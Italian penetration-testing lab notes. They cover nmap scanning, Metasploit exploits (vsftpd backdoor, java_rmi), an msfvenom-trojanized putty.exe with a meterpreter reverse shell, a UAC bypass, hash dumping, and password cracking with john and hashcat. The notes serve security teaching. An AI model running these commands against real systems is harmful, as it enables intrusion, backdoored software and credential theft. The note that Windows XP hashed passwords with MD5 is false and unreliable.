***PORTE***
https://it.wikipedia.org/wiki/Lista_di_porte_standard

la porta di default dell'http e' la porta 80
la porta di default di https e' 443
per avviare servizi su delle porte sotto la 1024 serve per forza l'utente root

per fare la scansione delle porte, si puo' utilizzare nmap
es. nmap 192.168.236.139

passando il parametro -p possiamo passare l'indicazione della porta o di un intero range
es. nmap 192.168.236.139 -p 1-65535 (range di porte)
es. nmap 192.168.236.139 -p- (tutte le porte)

HOST DISCOVERY: passando il parametro -s imposto il tipo di scansione

	passando il parametro -S non completa il three-way handshake (mando il syn, aspetto il syn/ack e non rispondo)
	es. nmap -sS 192.168.236.139 -p 1-65535

	passando il parametro -V effettua il versioning (effettua banner grabbing)

	il parametro -C esegue script di vulnerabilita' rese pubbliche sulle porte che trova aperte


***CVE***
E' un dizionario di vulnerabilita' e falle di sicurezza note pubblicamente. Il CVE insomma e' un codice identificativo univoco con la sintassi CVE-anno-codiceunivocovulnerabilita' (es. CVE-2017-12345)

https://www.first.org/cvss/calculator/3.0


***EXPLOIT***
individua tipo di vulnerabilita'


***PAYLOAD***
parte di codice che mi permette di sfruttare la vulnerabilita'

set payload cmd/unix/interact --> comportamento che dovra' compiere l'exploit

***METASPLOIT***
apt-get install metasploit-framework

	***Attacco n.1***
		search vsftp  --> cerco nel db di metasploit se e' presente un exploit
		use exploit/unix/ftp/vsftpd_234_backdoor  --> use (nome dell'exploit)
		show options  --> consente di vedere i parametri da personalizzare per l'exploit
		set RHOSTS  --> vado ad inserire l'IP della vittima
		set payload cmd/unix/interact --> comportamento che dovra' compiere l'exploit
		run --> manda il comando per avviare l'exploit

	***Attacco n. 2***
		use exploit/multi/misc/java_rmi_server
		set RHOSTS 192.168.236.139
		use PAYLOAD java/meterpreter/reverse_tcp
		set LHOST 192.168.236.1
		set HTTPDELAY 30
		run

		una volta ottenuto l'accesso, scarico PASSWD e SHADOW
		una volta scaricato /etc/passwd e /etc/shadow
		unshadow
		unshadow passwd shadow > lepassword.txt
		john lepassword.txt --> http://www.di-srv.unisa.it/~ads/corso-security/www/CORSO-0203/crack/johnexamples.html

***il comando 'background' ti mette un exploit in background per consentirci di settare altri payload (o funzioni)


***MSFVENOM***
	msfvenom cheatsheet (http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/)

msfvenom -p (indico il payload) windows/meterpreter_reverse_tcp -f (formato) exe -o (nome del file) putty_evil.exe -x (specifica un template) putty.exe LHOST=193.168.236.1 LPORT=4444


***Laboratorio 9 febbraio***
REVERSE TCP
	msfvenom -p windows/meterpreter_reverse_tcp -f exe -o putty_evil.exe -x putty.exe LHOST=193.168.236.1 LPORT=4444
	msfconsole
	use exploit/multi/handler  (exploit vuoto)
	set payload windows/meterpreter_reverse_tcp
	set LHOST (IP macchina locale)
	run
	pwd (e dovrei vedere la cartella dove mi trovo nel pc vittima)
	getuid (vedo utente)
	background (metto in background la sessione attiva)
	use exploit/windows/local/bypassuac (exploit che bypassa l'uac)
	show options
	set payload windows/meterpreter/reverse_tcp
	set LHOST (ip della kali)
	set LPORT 4445 *bisogna cambiare la porta
	run

	METERPRETER
		getsystem
		getuid  --> e sono diventato SYSTEM
		run post/windows/gather/hashdump

	(metto il dump dento un file)
	john (nome file con hash) --format=NT (cosi' mi stampa a video le password craccate)
	(da windows) hashcat64 -m 1000 hashdump.txt (file da craccare) wordlist (rockyou)


BIND SHELL
	msfvenom --list payload | grep windows | grep meterpreter
	(trovata windows/meterpreter_bind_tcp)

	msfconsole
		use windows/meterpreter_bind_tcp


MULTI HANDLER
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter_reverse_tcp; set LHOST 192.168.236.1 ; set LPORT 4444 ; run" (scriviamo tutte le opzioni su un'unica riga di comando)






*** N O T E ***
msfvenom --> si possono applicare encoding con --encoder o --encrypt
ebola --> cifra l'eseguibile e decifra al runtime

inviare file tramite nc
	(macchina server - invia file)
	nc -lvp 12345  (mi metto in ascolto sulla porta 12345) < (file da inviare)

	(macchina client - riceve file)
	nc (IP inviante) 12345 > Desktop\test.txt (dir e nome file di destinazione)






l'exploit e' lo sfruttamento della vulnerabilita'
il payload sono le operazioni che vogliamo far fare all'exploit


storicizzazione password windows in NT/LM

con WIN XP: le pwd venivano salvate in md5, la prima parte, e sempre in md5 con gli ultimi 7 caratteri in maiuscolo



Software per VA
	Nessus
	Nexpose
	Openvas

***EXECUTIVE SUMMARY***
ovvero il report finale
standard ISO 27001/2
OSSTMM
OWASP